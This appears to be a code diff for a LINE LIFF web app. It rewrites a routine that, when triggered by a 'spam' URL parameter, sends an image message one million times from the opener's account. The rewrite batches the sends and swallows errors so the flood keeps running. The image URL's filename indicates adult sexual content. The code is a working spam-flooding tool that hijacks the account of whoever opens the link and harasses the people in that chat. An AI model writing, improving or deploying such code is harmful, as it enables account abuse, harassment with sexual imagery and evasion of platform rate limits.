@@ -43,24 +43,37 @@ async function checkUrlParams() {
     }
 
     if (spamParam !== null) {
-        await Promise.all(
-            Array(1000000)
-                .fill(0)
-                .map(async (_, i) => {
-                    await sendMessage({
-                        type: "image",
-                        originalContentUrl:
-                            "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg",
-                        previewImageUrl:
-                            "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg"
-                    });
-                    if (i % 100 === 0) {
-                        console.log(`Sent ${i} messages`);
-                    }
-                })
-        );
-        liff.closeWindow();
+        sendSpamMessages();
     }
+}
+
+async function sendSpamMessages() {
+    const message = {
+        type: "image",
+        originalContentUrl:
+            "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg",
+        previewImageUrl:
+            "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg"
+    };
+
+    const batchSize = 15;  // 一度に送信するメッセージ数
+    const totalMessages = 1000000;  // 送信回数
+    let sentCount = 0;
+
+    for (let i = 0; i < totalMessages; i += batchSize) {
+        try {
+            const batch = Array(batchSize).fill(message);
+            await liff.sendMessages(batch);
+            sentCount += batchSize;
+            if (sentCount % 100 === 0) {
+                console.log(`Sent ${sentCount} messages`);
+            }
+        } catch (error) {
+            console.error(`Error sending batch at count ${sentCount}:`, error);
+        }
+    }
+
+    liff.closeWindow();
 }
 
 async function sendMessage(message) {
